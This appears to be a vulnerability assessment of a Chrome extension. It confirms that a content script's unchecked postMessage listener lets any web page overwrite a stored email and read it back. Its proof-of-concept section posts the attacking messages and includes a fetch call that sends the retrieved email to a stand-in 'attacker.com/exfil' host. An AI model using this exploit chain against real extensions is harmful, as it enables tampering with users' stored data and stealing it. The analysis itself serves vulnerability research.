# CoCo Analysis: anlcklajofeiicoliahegfddlchglank

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both variations of the same vulnerability)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/anlcklajofeiicoliahegfddlchglank/opgen_generated_files/cs_0.js
Line 699: window.addEventListener("message", (event) => {
Line 701: let data = event.data;
Line 715: if (data.email) {

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener("message", (event) => {  // Line 699
  try {
    let data = event.data;  // Line 701 - attacker-controlled

    if (typeof data === 'string') {
      try {
        data = JSON.parse(data);  // Line 705
      } catch (jsonError) {
        return;
      }
    }

    if (data && typeof data === 'object') {
      switch(data.requestType) {
        case "SAVE_EMAIL":
          if (data.email) {  // Line 715 - attacker-controlled email
            saveEmail(data.email);  // Line 716
          }
          break;
        case "GET_EMAIL":  // Retrieval path!
          chrome.runtime.sendMessage({action: "getEmail"}, function(response) {  // Line 726
            const iframe = document.querySelector('#extension-sidebar iframe');
            if (iframe) {
              iframe.contentWindow.postMessage({  // Line 729
                type: 'EMAIL_RESPONSE',
                email: response.email  // Sends poisoned data back to attacker
              }, '*');  // Line 732 - wildcard origin allows attacker to receive
            }
          });
          break;
      }
    }
  } catch (e) {}
});

function saveEmail(email) {  // Line 744
  chrome.runtime.sendMessage({action: "saveEmail", email: email}, function(response) {  // Line 745
    // email forwarded to background
  });
}

// Background script (bg.js) - Storage sink
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {  // Line 975
    if (request.action === "saveEmail") {  // Line 976
        chrome.storage.local.set({ 'userEmail': request.email }, function() {  // Line 977 - SINK
            sendResponse({success: true});
        });
        return true;
    } else if (request.action === "getEmail") {  // Line 981 - Retrieval handler
        chrome.storage.local.get(['userEmail'], function(result) {  // Line 982
            if (result.userEmail) {
                sendResponse({email: result.userEmail});  // Line 984 - Returns poisoned data
            } else {
                sendResponse({email: chrome.i18n.getMessage("noEmailSaved")});
            }
        });
        return true;
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event listener in content script)

**Attack:**

```javascript
// Step 1: Attacker poisons storage with malicious email
window.postMessage({
    requestType: "SAVE_EMAIL",
    email: "attacker@evil.com"
}, "*");

// Step 2: Attacker retrieves poisoned data back
window.addEventListener("message", function(event) {
    if (event.data.type === "EMAIL_RESPONSE") {
        console.log("Retrieved poisoned email:", event.data.email);
        // Send to attacker's server
        fetch("https://attacker.com/exfil", {
            method: "POST",
            body: JSON.stringify({email: event.data.email})
        });
    }
});

window.postMessage({
    requestType: "GET_EMAIL"
}, "*");
```

**Impact:** Complete storage exploitation chain. Attacker can poison the extension's storage with arbitrary email addresses and retrieve stored data back via postMessage with wildcard origin. This allows both storage manipulation and information disclosure of any stored email address.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/anlcklajofeiicoliahegfddlchglank/opgen_generated_files/cs_0.js
Line 699: window.addEventListener("message", (event) => {
Line 701: let data = event.data;
Line 705: data = JSON.parse(data);
Line 715: if (data.email) {

**Classification:** TRUE POSITIVE

**Reason:** This is the same vulnerability as Sink 1, but traces through the JSON.parse path when data is a string rather than an object. The exploitation and impact are identical.
